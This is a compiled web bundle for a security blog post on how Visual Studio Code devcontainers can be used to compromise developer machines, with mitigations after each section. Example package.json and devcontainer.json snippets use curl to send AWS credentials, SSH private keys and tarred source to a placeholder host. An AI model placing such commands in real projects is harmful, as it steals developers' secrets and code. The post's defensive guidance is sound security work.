(window.webpackJsonp=window.webpackJsonp||[]).push([[14],{118:function(e,t,n){"use strict";n.d(t,"a",(function(){return d})),n.d(t,"b",(function(){return b}));var o=n(0),a=n.n(o);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,o,a=function(e,t){if(null==e)return{};var n,o,a={},i=Object.keys(e);for(o=0;o<i.length;o++)n=i[o],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(o=0;o<i.length;o++)n=i[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=a.a.createContext({}),u=function(e){var t=a.a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},d=function(e){var t=u(e.components);return a.a.createElement(s.Provider,{value:t},e.children)},m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.a.createElement(a.a.Fragment,{},t)}},p=a.a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,r=e.parentName,s=l(e,["components","mdxType","originalType","parentName"]),d=u(n),p=o,b=d["".concat(r,".").concat(p)]||d[p]||m[p]||i;return n?a.a.createElement(b,c(c({ref:t},s),{},{components:n})):a.a.createElement(b,c({ref:t},s))}));function b(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,r=new Array(i);r[0]=p;var c={};for(var l in t)hasOwnProperty.call(t,l)&&(c[l]=t[l]);c.originalType=e,c.mdxType="string"==typeof e?e:o,r[1]=c;for(var s=2;s<i;s++)r[s]=n[s];return a.a.createElement.apply(null,r)}return a.a.createElement.apply(null,n)}p.displayName="MDXCreateElement"},80:function(e,t,n){"use strict";n.r(t),n.d(t,"frontMatter",(function(){return r})),n.d(t,"metadata",(function(){return c})),n.d(t,"toc",(function(){return l})),n.d(t,"default",(function(){return u}));var o=n(3),a=n(7),i=(n(0),n(118)),r={slug:"exploiting-visual-studio-code-devcontainers",title:"Exploiting Visual Studio Code Devcontainers",author:"Jamie McCrindle",author_title:"foldr",author_url:"https://github.com/jamiemccrindle",author_image_url:"https://avatars.githubusercontent.com/u/909696?s=60&v=4",tags:["cybersec","security","vsc","visual-studio-code","devcontainer"]},c={permalink:"/exploiting-visual-studio-code-devcontainers",editUrl:"https://github.com/jamiemccrindle/foldr.uk/tree/main/foldr-uk-website/blog/blog/2021-06-05-exploiting-visual-studio-devcontainers.md",source:"@site/blog/2021-06-05-exploiting-visual-studio-devcontainers.md",description:'To quote Scott Hanselman "Visual Studio Code Remote Development may change everything". They are a great way to build consistent development environments which can massively lower the friction for new people to contribute to a code base.',date:"2021-06-05T00:00:00.000Z",formattedDate:"June 5, 2021",tags:[{label:"cybersec",permalink:"/tags/cybersec"},{label:"security",permalink:"/tags/security"},{label:"vsc",permalink:"/tags/vsc"},{label:"visual-studio-code",permalink:"/tags/visual-studio-code"},{label:"devcontainer",permalink:"/tags/devcontainer"}],title:"Exploiting Visual Studio Code Devcontainers",readingTime:5.385,truncated:!1,nextItem:{title:"Running a devcontainer in an Azure App Service",permalink:"/azure-app-service-devcontainer"}},l=[{value:"At build or install time",id:"at-build-or-install-time",children:[]},{value:"Untrusted devcontainer images",id:"untrusted-devcontainer-images",children:[]},{value:"postCreateCommand, postStartCommand, postAttachCommand",id:"postcreatecommand-poststartcommand-postattachcommand",children:[]},{value:"Malicious extensions",id:"malicious-extensions",children:[]},{value:"Docker-from-docker",id:"docker-from-docker",children:[]},{value:"Mounts",id:"mounts",children:[]},{value:"initializeCommand",id:"initializecommand",children:[]}],s={toc:l};function u(e){var t=e.components,n=Object(a.a)(e,["components"]);return Object(i.b)("wrapper",Object(o.a)({},s,n,{components:t,mdxType:"MDXLayout"}),Object(i.b)("p",null,'To quote Scott Hanselman "Visual Studio Code Remote Development may change everything". They are a great way to build consistent development environments which can massively lower the friction for new people to contribute to a code base.'),Object(i.b)("p",null,"That said, they do create new paths to exploiting developer's machines and devcontainers are often opaque to existing security scanning tooling. This post is not about an specific vulnerability in devcontainers but more what potential paths to exploitation devcontainers represent."),Object(i.b)("p",null,"It is also becoming increasingly common for open source projects to include devcontainer configuration in their projects, acclimatising developers to running new forms of potentially untrusted code on their local machines."),Object(i.b)("p",null,"This post focusses on Visual Studio Code Remote Containers that run in Docker on a developers machine."),Object(i.b)("h1",{id:"the-risks"},"The risks"),Object(i.b)("p",null,"Compromising a developer's machine can lead to further compromise. They will often contain a number of credentials that allow the developer to do their work e.g. SSH keys, AWS / GCE / Azure credentials, AD tokens etc. If these credentials are inside the devcontainer they are usually stored in the clear as the devcontainer docker container often does not have access to the host's credential manager."),Object(i.b)("p",null,"Developers quite often have elevated access both to their local machines as well as resources on the network."),Object(i.b)("p",null,"Risks as a result of compromising a developer's machine include:"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Exfiltration of source code"),Object(i.b)("li",{parentName:"ul"},"Exfiltration or exploitation of developer credentials e.g. SSH Keys, AWS / GCE / Azure credentials etc."),Object(i.b)("li",{parentName:"ul"},"Lateral movement inside the network")),Object(i.b)("h1",{id:"running-malicious-code-inside-a-devcontainer"},"Running malicious code inside a devcontainer"),Object(i.b)("p",null,"Your devcontainer is compromised if an attacker can execute malicious code inside it. Here are some of the ways this could happen."),Object(i.b)("h2",{id:"at-build-or-install-time"},"At build or install time"),Object(i.b)("p",null,"Running any install or build commands in a code base could be used to run malicious code e.g.: "),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"npm / yarn"),Object(i.b)("li",{parentName:"ul"},"msbuild"),Object(i.b)("li",{parentName:"ul"},"mvn / ant / gradle"),Object(i.b)("li",{parentName:"ul"},"etc.")),Object(i.b)("p",null,"e.g. in a package.json you could have: "),Object(i.b)("pre",null,Object(i.b)("code",{parentName:"pre",className:"language-json"},'{\n  "name": "super-useful-open-source-tool",\n  "scripts": {\n    // runs after npm install. a smart attacker would obfuscate this a little more\n    "postinstall": "curl very-innocent.url -d @~/.aws/credentials"\n  }\n}\n')),Object(i.b)("p",null,"An attacker could also use a supply chain attack via a compromised dependency or use dependency confusion to introduce malicious code when the application is run."),Object(i.b)("p",null,"Note, this kind of attack applies to running code outside of the devcontainer too."),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Check the build scripts of any untrusted code you install"),Object(i.b)("li",{parentName:"ul"},"Run dependency scanning tools e.g. ",Object(i.b)("inlineCode",{parentName:"li"},"npm audit")," or snyk and address any warnings"),Object(i.b)("li",{parentName:"ul"},"Make sure your artifact repository is safe from ",Object(i.b)("a",{parentName:"li",href:"https://portswigger.net/daily-swig/open-source-software-repositories-play-whack-a-mole-as-dependency-confusion-copycats-exceed-5-000"},"dependency confusion attacks"))),Object(i.b)("p",null,":::"),Object(i.b)("h2",{id:"untrusted-devcontainer-images"},"Untrusted devcontainer images"),Object(i.b)("p",null,"Devcontainers allow you to use arbitrary docker images for your development environment. If these have been compromised, it is trivial for attackers to run malicious code inside your devcontainer."),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Use signed / trusted docker images only"),Object(i.b)("li",{parentName:"ul"},"Scan your devcontainer docker images for vulnerabilities")),Object(i.b)("p",null,":::"),Object(i.b)("h2",{id:"postcreatecommand-poststartcommand-postattachcommand"},"postCreateCommand, postStartCommand, postAttachCommand"),Object(i.b)("p",null,Object(i.b)("inlineCode",{parentName:"p"},"devcontainer.json")," allows you to configure a number of commands that can run in the devcontainer docker container after the container is created, after the container has started and after Visual Studio Code attaches to the container. These are ",Object(i.b)("inlineCode",{parentName:"p"},"postCreateCommand"),", ",Object(i.b)("inlineCode",{parentName:"p"},"postStartCommand")," and ",Object(i.b)("inlineCode",{parentName:"p"},"postAttachCommand")," respectively."),Object(i.b)("p",null,"e.g. a ",Object(i.b)("inlineCode",{parentName:"p"},"devcontainer.json")," file with this config this would upload all of the contents of the working directory including local .env, .npmrc files etc."),Object(i.b)("pre",null,Object(i.b)("code",{parentName:"pre",className:"language-json"},'{\n    // send all the source inside the devcontainer somewhere. a smart attacker would obfuscate this a little more.\n    "postAttachCommand": "tar -czvf /tmp/debug.tgz . && curl very-innocent.url --data-binary @/tmp/debug.tgz",\n}\n')),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Check the postCreateCommand, postStartCommand and postAttachCommand configuration in untrusted devcontainer.json files. ")),Object(i.b)("p",null,":::"),Object(i.b)("h2",{id:"malicious-extensions"},"Malicious extensions"),Object(i.b)("p",null,"Malicious extensions can be used to run arbitrary code in whichever environment Visual Studio Code is running in including devcontainers."),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Use trusted extensions only.")),Object(i.b)("p",null,":::"),Object(i.b)("h1",{id:"escaping-onto-the-devcontainer-host"},"Escaping onto the devcontainer host"),Object(i.b)("p",null,"Devcontainers can offer an additional layer of protection for a developers host machine but a number of common practices can make it easy to read files, write files or execute code on the host machine."),Object(i.b)("h2",{id:"docker-from-docker"},"Docker-from-docker"),Object(i.b)("p",null,"If your devcontainer does docker-from-docker i.e. where the docker socket is mounted into the devcontainer, an attacker has almost unfettered access to the host machine e.g. the following ",Object(i.b)("inlineCode",{parentName:"p"},"devcontainer.json")," could be used to upload your ssh keys to a remote location even if you're only sharing them into the container via an ssh-agent."),Object(i.b)("pre",null,Object(i.b)("code",{parentName:"pre",className:"language-json"},'{\n    "mount": [ "source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind" ],\n    "postAttachCommand": "chmod a+x /var/run/docker.sock && docker run -v ${localEnv:HOME}:/tmp/home curlimages/curl very-innocent.url -d @/tmp/home/.ssh/id_rsa"\n}\n')),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Use ",Object(i.b)("a",{parentName:"li",href:"https://github.com/microsoft/vscode-dev-containers/tree/main/containers/docker-in-docker"},"docker-in-docker")," instead"),Object(i.b)("li",{parentName:"ul"},"Don't do docker-from-docker if you can help it."),Object(i.b)("li",{parentName:"ul"},"If you do have to run docker-from-docker take all the measures listed above to reduce the likelihood that malicious code can't be executed inside the devcontainer.")),Object(i.b)("p",null,":::"),Object(i.b)("h2",{id:"mounts"},"Mounts"),Object(i.b)("p",null,"It's common to mount host machine directories into the devcontainer docker container. Usually this is only the source directory but any path on the host machine could be mounted into the container e.g. the mount in this sample is from the ",Object(i.b)("a",{parentName:"p",href:"https://code.visualstudio.com/docs/remote/containers-advanced#_adding-another-local-file-mount"},"Microsoft docs on advanced containers")," which binds a users home directory into the container, so it wouldn't look unusual. Developer home directories often contain things like SSH keys, AWS credentials etc."),Object(i.b)("p",null,"The following could upload a developers ssh key to a remote location"),Object(i.b)("pre",null,Object(i.b)("code",{parentName:"pre",className:"language-json"},'{\n    "mounts": [\n        "source=${localEnv:HOME}${localEnv:USERPROFILE},target=/host-home-folder,type=bind,consistency=cached"\n    ],\n    "postAttachCommand": "curl very-innocent.url -d /host-home-folder/.ssh/id.rsa"\n}\n')),Object(i.b)("p",null,"::: info How to mitigate"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Check untrusted ",Object(i.b)("inlineCode",{parentName:"li"},"devcontainer.json")," files for suspicious mounts"),Object(i.b)("li",{parentName:"ul"},"Don't mount anything you don't need into the devcontainer"),Object(i.b)("li",{parentName:"ul"},"Limit the directories that docker will share with any containers")),Object(i.b)("p",null,":::"),Object(i.b)("h2",{id:"initializecommand"},"initializeCommand"),Object(i.b)("p",null,"The value of ",Object(i.b)("inlineCode",{parentName:"p"},"initializeCommand")," inside the ",Object(i.b)("inlineCode",{parentName:"p"},"devcontainer.json")," file will run on the host machine e.g. this would upload a developers ssh key on the host machine to a remote location:"),Object(i.b)("pre",null,Object(i.b)("code",{parentName:"pre",className:"language-json"},'{\n    "installCommand": "curl very-innocent.url -d ${localEnv:HOME}.ssh/id.rsa"\n}\n')),Object(i.b)("h1",{id:"general-devcontainer-security-precautions"},"General devcontainer security precautions"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"Avoid running untrusted devcontainers"),Object(i.b)("li",{parentName:"ul"},"If you do run untrusted devcontainers e.g. from open source projects, inspect the devcontainer configuration and look out for:",Object(i.b)("ul",{parentName:"li"},Object(i.b)("li",{parentName:"ul"},"malicious commands"),Object(i.b)("li",{parentName:"ul"},"suspicious dependencies"),Object(i.b)("li",{parentName:"ul"},"suspicious docker images"),Object(i.b)("li",{parentName:"ul"},"suspicious mounts"),Object(i.b)("li",{parentName:"ul"},"suspicious extensions"))),Object(i.b)("li",{parentName:"ul"},"Only mount what you need into the devcontainer docker container"),Object(i.b)("li",{parentName:"ul"},"Don't use docker-from-docker"),Object(i.b)("li",{parentName:"ul"},"Update your devcontainer images regularly to pull security patches"),Object(i.b)("li",{parentName:"ul"},"Run SCA tools against the dependencies inside your devcontainers"),Object(i.b)("li",{parentName:"ul"},"Scan your devcontainer docker images"),Object(i.b)("li",{parentName:"ul"},"Only use trusted devcontainer docker images")))}u.isMDXComponent=!0}}]);